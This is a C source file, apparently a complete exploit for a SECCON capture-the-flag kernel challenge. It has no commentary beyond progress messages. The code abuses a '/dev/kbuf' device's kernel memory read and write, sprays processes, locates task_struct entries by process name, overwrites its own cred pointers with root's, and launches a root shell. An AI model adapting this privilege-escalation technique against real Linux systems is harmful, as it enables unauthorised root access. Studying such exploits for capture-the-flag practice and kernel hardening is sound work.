#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define MY_NAME "SECCON!!"
#define ROOT_NAME "S99ctf\0\0"
#define N_SPRAY 10
#define LOCK_PATH "/tmp/.exploit-lock"

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

void spray_n_task(size_t n) {
  for (size_t i = 0; i < n; i++) {
    if (fork() == 0) {
      while (access(LOCK_PATH, O_RDONLY) == 0) {
        sleep(1);
      }

      if (getuid() == 0) {
        puts("[+] I got rooted!");
        system("/bin/sh");
      }

      exit(0);
    }
  }
}

void find_task_struct(int fd, size_t magic, size_t *ptask, size_t *pcred) {
  char buf[0x1000];

  size_t offset;
  for (offset = 0; ; offset += sizeof(buf)) {
    lseek(fd, offset, SEEK_SET);
    if (read(fd, buf, sizeof(buf)) != sizeof(buf)) continue;

    for (size_t j = 0; j < sizeof(buf); j += 0x10) {
      if (*(size_t*)(buf + j) == magic) {
        if (ptask) *ptask = offset + j - 0x5e0;
        if (pcred) *pcred = *(size_t*)(buf + j - 0x10);
        return;
      }
    }
  }
}

int main() {
  creat(LOCK_PATH, 0777);

  prctl(PR_SET_NAME, MY_NAME, 0, 0, 0);

  spray_n_task(N_SPRAY);

  int fd = open("/dev/kbuf", O_RDWR);
  if (fd < 0) fatal("/dev/kbuf");

  spray_n_task(N_SPRAY);

  size_t my_task = 0, root_task = 0, root_cred = 0;
  find_task_struct(fd, *(size_t*)MY_NAME, &my_task, NULL);
  printf("[+] Found user task_struct: 0x%lx\n", my_task);
  find_task_struct(fd, *(size_t*)ROOT_NAME, &root_task, &root_cred);
  printf("[+] Found root task_struct: 0x%lx\n", root_task);
  printf("[+] Found root cred: 0x%lx\n", root_cred);

  if ((root_cred >> 48) != 0xffff) {
    puts("[-] Bad luck!");
    exit(1);
  }

  lseek(fd, my_task + 0x5d0, SEEK_SET);
  write(fd, &root_cred, sizeof(root_cred)); // real_cred
  write(fd, &root_cred, sizeof(root_cred)); // cred

  puts("[+] Win!");
  unlink(LOCK_PATH);

  for (int i = 0; i < N_SPRAY * 2; i++) {
    wait(NULL);
  }

  puts("[-] Fail?");
  close(fd);
  return 0;
}